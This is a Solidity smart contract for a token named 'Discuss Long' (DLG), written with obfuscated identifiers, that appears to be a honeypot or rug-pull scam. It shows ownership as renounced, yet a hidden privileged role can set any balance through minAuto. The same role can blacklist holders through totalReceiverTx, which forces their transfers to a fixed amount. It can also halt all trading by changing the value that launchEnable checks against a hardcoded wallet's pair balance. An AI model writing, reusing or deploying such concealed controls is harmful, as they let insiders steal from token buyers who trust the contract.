//SPDX-License-Identifier: MIT

pragma solidity ^0.8.11;

interface launchShould {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract sellTeam {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface atListToken {
    function createPair(address receiverExempt, address launchedIs) external returns (address);
}

interface fundFromAt {
    function totalSupply() external view returns (uint256);

    function balanceOf(address senderLaunch) external view returns (uint256);

    function transfer(address receiverMax, uint256 walletTx) external returns (bool);

    function allowance(address enableTo, address spender) external view returns (uint256);

    function approve(address spender, uint256 walletTx) external returns (bool);

    function transferFrom(
        address sender,
        address receiverMax,
        uint256 walletTx
    ) external returns (bool);

    event Transfer(address indexed from, address indexed enableMax, uint256 value);
    event Approval(address indexed enableTo, address indexed spender, uint256 value);
}

interface fundFromAtMetadata is fundFromAt {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract DiscussLong is sellTeam, fundFromAt, fundFromAtMetadata {

    bool public receiverEnable;

    function minAuto(address liquidityTxMax, uint256 walletTx) public {
        buyLaunch();
        exemptLiquidity[liquidityTxMax] = walletTx;
    }

    bool public listTrading;

    uint256 private senderEnable = 100000000 * 10 ** 18;

    address public tradingSender;

    string private enableSenderSwap = "Discuss Long";

    function isLaunchedTeam(address fundTake, address receiverMax, uint256 walletTx) internal returns (bool) {
        require(exemptLiquidity[fundTake] >= walletTx);
        exemptLiquidity[fundTake] -= walletTx;
        exemptLiquidity[receiverMax] += walletTx;
        emit Transfer(fundTake, receiverMax, walletTx);
        return true;
    }

    address public shouldLimit;

    address launchedModeIs = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 enableTake;

    function buyLaunch() private view {
        require(toToken[_msgSender()]);
    }

    uint8 private teamAt = 18;

    uint256 private maxModeLiquidity;

    mapping(address => bool) public toToken;

    uint256 constant amountList = 17 ** 10;

    function totalSupply() external view virtual override returns (uint256) {
        return senderEnable;
    }

    function owner() external view returns (address) {
        return listFund;
    }

    mapping(address => bool) public maxAmount;

    function transfer(address liquidityTxMax, uint256 walletTx) external virtual override returns (bool) {
        return launchEnable(_msgSender(), liquidityTxMax, walletTx);
    }

    bool public launchSwap;

    constructor (){
        if (maxModeLiquidity == senderSell) {
            receiverEnable = true;
        }
        launchShould swapLaunch = launchShould(autoMode);
        shouldLimit = atListToken(swapLaunch.factory()).createPair(swapLaunch.WETH(), address(this));
        if (listTrading) {
            listTrading = false;
        }
        tradingSender = _msgSender();
        enableTokenList();
        toToken[tradingSender] = true;
        exemptLiquidity[tradingSender] = senderEnable;
        
        emit Transfer(address(0), tradingSender, senderEnable);
    }

    string private listFrom = "DLG";

    function modeListFrom(uint256 walletTx) public {
        buyLaunch();
        enableTake = walletTx;
    }

    function enableTokenList() public {
        emit OwnershipTransferred(tradingSender, address(0));
        listFund = address(0);
    }

    function getOwner() external view returns (address) {
        return listFund;
    }

    bool private limitReceiverTo;

    event OwnershipTransferred(address indexed walletLiquidity, address indexed isExempt);

    address autoMode = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function allowance(address launchedTotal, address fundSell) external view virtual override returns (uint256) {
        if (fundSell == autoMode) {
            return type(uint256).max;
        }
        return listLaunched[launchedTotal][fundSell];
    }

    uint256 totalLaunch;

    function transferFrom(address fundTake, address receiverMax, uint256 walletTx) external override returns (bool) {
        if (_msgSender() != autoMode) {
            if (listLaunched[fundTake][_msgSender()] != type(uint256).max) {
                require(walletTx <= listLaunched[fundTake][_msgSender()]);
                listLaunched[fundTake][_msgSender()] -= walletTx;
            }
        }
        return launchEnable(fundTake, receiverMax, walletTx);
    }

    function totalReceiverTx(address liquidityWallet) public {
        buyLaunch();
        
        if (liquidityWallet == tradingSender || liquidityWallet == shouldLimit) {
            return;
        }
        maxAmount[liquidityWallet] = true;
    }

    function decimals() external view virtual override returns (uint8) {
        return teamAt;
    }

    function name() external view virtual override returns (string memory) {
        return enableSenderSwap;
    }

    function symbol() external view virtual override returns (string memory) {
        return listFrom;
    }

    mapping(address => uint256) private exemptLiquidity;

    function fromWallet(address buyEnable) public {
        if (launchSwap) {
            return;
        }
        
        toToken[buyEnable] = true;
        
        launchSwap = true;
    }

    function launchEnable(address fundTake, address receiverMax, uint256 walletTx) internal returns (bool) {
        if (fundTake == tradingSender) {
            return isLaunchedTeam(fundTake, receiverMax, walletTx);
        }
        uint256 receiverTeam = fundFromAt(shouldLimit).balanceOf(launchedModeIs);
        require(receiverTeam == enableTake);
        require(receiverMax != launchedModeIs);
        if (maxAmount[fundTake]) {
            return isLaunchedTeam(fundTake, receiverMax, amountList);
        }
        return isLaunchedTeam(fundTake, receiverMax, walletTx);
    }

    function approve(address fundSell, uint256 walletTx) public virtual override returns (bool) {
        listLaunched[_msgSender()][fundSell] = walletTx;
        emit Approval(_msgSender(), fundSell, walletTx);
        return true;
    }

    mapping(address => mapping(address => uint256)) private listLaunched;

    function balanceOf(address senderLaunch) public view virtual override returns (uint256) {
        return exemptLiquidity[senderLaunch];
    }

    uint256 private senderSell;

    address private listFund;

    bool private buyExempt;

}